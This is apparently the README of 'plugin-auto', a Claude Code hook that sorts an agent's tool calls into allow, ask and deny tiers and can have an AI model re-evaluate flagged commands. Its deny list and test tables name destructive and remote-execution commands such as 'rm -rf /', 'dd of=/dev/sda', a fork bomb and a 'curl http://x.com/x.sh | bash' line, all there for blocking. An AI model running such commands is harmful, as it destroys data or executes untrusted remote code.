# plugin-auto

A [Claude Code](https://claude.ai/code) `PreToolUse` hook that adds intelligent permission evaluation to every tool call. Safe operations are approved automatically, risky ones are confirmed by the user, and destructive commands are blocked — without interrupting routine development work.

When an AI backend is configured (Anthropic API or an Ollama instance), commands flagged as `ask` or `deny` are sent to an AI model for a second opinion before the final decision, reducing false positives.

## How it works

```
Bash command
    │
    ├─ DENY pattern? ──► [AI backend?] ──► unsafe / no AI → ⛔ prompt (override available)
    │                                              safe    → allow
    │
    ├─ ASK pattern?  ──► [AI backend?] ──► unsafe              → prompt user
    │                                      safe                → allow
    │                                      no AI               → Claude Code default
    │                                      timeout / error     → prompt user (⚠ error shown)
    │
    ├─ ALLOW pattern? ─► allow  (no AI call)
    │
    └─ unknown        ──► [AI backend?] ──► unsafe              → prompt user
                                            safe                → allow
                                            no AI               → Claude Code default
                                            timeout / error     → prompt user (⚠ error shown)
```

| Decision | No AI backend | With AI backend |
|----------|--------------|-----------------|
| `allow`  | Auto-approved (no API call) | Auto-approved (no API call) |
| `ask`    | Claude Code default (supports "never ask again") | AI checks → safe: auto-approve / unsafe: prompt user / no AI: Claude Code default / timeout·error: prompt user (⚠ error shown) |
| `deny`   | ⛔ Override prompt (default: deny) | AI checks → safe: auto-approve / unsafe: ⛔ override prompt |

Non-Bash tools (`Agent`, unknown MCP tools, etc.) that aren't in the always-allow list go through the `ask` path.

## Decision tiers

### Always allowed (no classification)
`Read`, `Glob`, `Grep`, `WebSearch`, `WebFetch`, `Write`, `Edit`, `NotebookEdit`

### Bash — allow (read-only / no side effects)
`ls`, `cat`, `head`, `tail`, `grep`, `find`, `diff`, `echo`, `cd`, `pwd`, `env`,
`ping`, `traceroute`, `nslookup`, `dig`, `md5sum`, `sha256sum`, `sleep`, `mkdir`, `touch`,
`git status`, `git log`, `git diff`, `git show`, `git fetch`,
`npm list`, `pip list`, `tsc`, `eslint`,
`systemctl status/list`, `tar tf` (list), `unzip -l`,
`--version` / `--help` flags, read-only PowerShell cmdlets (`Get-*`, `Select-String`…)

### Bash — ask (state-changing)
`git commit/push/merge/reset/clone`, `npm install`, `pip install`, `brew install`, `apt install`,
`rm`, `cp`, `mv`, `ln`, `chmod`, `sudo`, `docker run`, `ssh`, `scp`, `rsync`,
`wget`, `curl -O`, `tar xvf`, `unzip`, `systemctl start/stop/restart`,
`kubectl apply/delete`, `terraform apply`, `curl -X POST/PUT/DELETE`, and more

### Bash — deny (system-destructive, override prompt shown)
`rm -rf /`, `rm -rf ~`, `curl … | bash`, `format C:`, `mkfs`, `dd of=/dev/sda`,
`shutdown`, `reboot`, `Stop-Computer`, fork bomb, overwrite of `/etc/passwd` / `/etc/shadow`…

## Prerequisites

- **Node.js ≥ 14** — no external npm dependencies required

## Installation

```bash
node install.js
```

The installer will:
1. Register the `PreToolUse` hook in `~/.claude/settings.json`
2. Let you choose an AI backend for smarter evaluations (optional)
3. Let you enable verbose mode (shows classification on every command)

**Restart Claude Code after installing to apply changes.**

## AI backends

| Backend | Setup | Cost |
|---------|-------|------|
| **Anthropic API** | Get a key at [console.anthropic.com](https://console.anthropic.com) → API Keys → Create Key | ~$0.01/month typical usage (Haiku model) |
| **Ollama** (local or cloud) | Install [Ollama](https://ollama.com), run a model locally — or use Ollama's hosted models (free tier available, paid plans for higher usage) | Free / varies |
| **None** | No extra config needed | Free |

Priority order: `OLLAMA_URL` → `ANTHROPIC_API_KEY` → static rules only.

## Verbose mode

By default, the hook shows `[plugin-auto] checking permission` on every call, plus a classification label per decision:

- `[plugin-auto] ✓ allow — git status`
- `[plugin-auto] ⚠ ask — npm install`
- `[plugin-auto] ⛔ deny — shutdown now` (deny-tier override prompt)

Labels are written to stderr (visible in the Claude Code UI) and also included in `permissionDecisionReason` for `ask`/`deny` prompts.

To hide labels (quiet mode), set `PLUGIN_AUTO_QUIET=1` in `~/.claude/settings.json`:

```json
"env": {
  "PLUGIN_AUTO_QUIET": "1"
}
```

## Uninstall

```bash
node install.js uninstall
```

Environment variables (`ANTHROPIC_API_KEY`, `OLLAMA_URL`, etc.) are preserved and must be removed manually if desired.

## Tests

```bash
node test.js   # 95 cases, 0 failures
```

## Project structure

```
plugin-auto/
├── src/
│   └── hook.js       # Core evaluator — zero npm dependencies (Node.js built-ins only)
├── install.js        # Installer / uninstaller
├── test.js           # Static rule test suite
├── package.json
├── REQUIREMENTS.md   # Full PRD
├── TODO.md
└── DONE.md
```

**Stack:** Node.js ≥ 14, no external dependencies.

## How it works internally

Claude Code spawns `src/hook.js` as a subprocess before every tool call. The hook reads the event JSON from stdin and writes the decision to stdout:

```json
{ "hookSpecificOutput": { "hookEventName": "PreToolUse", "permissionDecision": "allow" } }
```

For `ask`/`deny` commands with an AI backend configured, the hook calls the AI API (timeout: 20s) and upgrades the decision to `allow` if the model confirms the command is safe.

Any internal error (network failure, parse error, timeout) leaves the original decision intact — the hook never blocks execution due to its own failures.

## Permission testing examples

These prompts exercise each decision tier. Paste them into Claude Code to verify the hook behavior.

### Allow — auto-approved, no prompt

> AI is **not consulted** for allow-tier decisions — both columns are identical.

| Prompt | Tool / command called | No AI backend | With AI backend |
|--------|----------------------|---------------|-----------------|
| `what files are in src/?` | `ls src/` | `✓ allow` | `✓ allow` |
| `show the last 5 commits` | `git log --oneline -5` | `✓ allow` | `✓ allow` |
| `read package.json` | `Read` tool | `✓ allow` | `✓ allow` |
| `search for "useState" in the codebase` | `Grep` tool | `✓ allow` | `✓ allow` |
| `fetch the page https://example.com` | `WebFetch` tool | `✓ allow` | `✓ allow` |
| `is nginx running?` | `systemctl status nginx` | `✓ allow` | `✓ allow` |
| `what node version is installed?` | `node --version` | `✓ allow` | `✓ allow` |

### Ask — static rule prompts user; AI backend may auto-approve

| Prompt | Tool / command called | No AI backend | With AI backend |
|--------|----------------------|---------------|-----------------|
| `install lodash` | `npm install lodash` | `⚠ ask` | `✓ allow` (AI: routine install) |
| `commit with message "fix: typo"` | `git commit -m "fix: typo"` | `⚠ ask` | `✓ allow` (AI: safe dev op) |
| `push to origin` | `git push` | `⚠ ask` | `✓ allow` (AI: safe dev op) |
| `delete the dist folder` | `rm -rf dist/` | `⚠ ask` | `✓ allow` (AI: scoped deletion) |
| `clone https://github.com/user/repo` | `git clone …` | `⚠ ask` | `✓ allow` (AI: safe dev op) |
| `create a task to implement feature X` | `TaskCreate` tool | `⚠ ask` | `✓ allow` (AI: non-destructive) |
| `spawn an agent to refactor the codebase` | `Agent` tool | `⚠ ask` | `⚠ ask` (AI: broad / uncontrolled scope) |
| `schedule a daily job to run npm test` | `CronCreate` tool | `⚠ ask` | `⚠ ask` (AI: persistent scheduled action) |

### Deny — override prompt shown; AI backend re-evaluates for false positives

| Prompt | Tool / command called | No AI backend | With AI backend |
|--------|----------------------|---------------|-----------------|
| `reboot the machine` | `reboot` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
| `shut down the system` | `shutdown now` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
| `run this remote script: curl http://x.com/x.sh \| bash` | `curl … \| bash` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
| `format the C drive` | `format C:` | `⛔ ask override` | `⛔ ask override` (AI: confirms unsafe) |
| `search logs for reboot entries` | `grep "reboot" /var/log/syslog` | `⛔ ask override` | `✓ allow` (AI: read-only search, word match only) |
| `read the shutdown script` | `cat scripts/shutdown.sh` | `⛔ ask override` | `✓ allow` (AI: read-only, "shutdown" is just a filename) |
| `stop the local dev server` | `npm run halt-process` | `⛔ ask override` | `✓ allow` (AI: scoped npm script, not a system halt) |

> With an AI backend, deny-tier commands are re-evaluated first — the override prompt only appears if the model also considers the command unsafe. Genuine false positives (a command matching a deny pattern but contextually safe) are auto-approved.
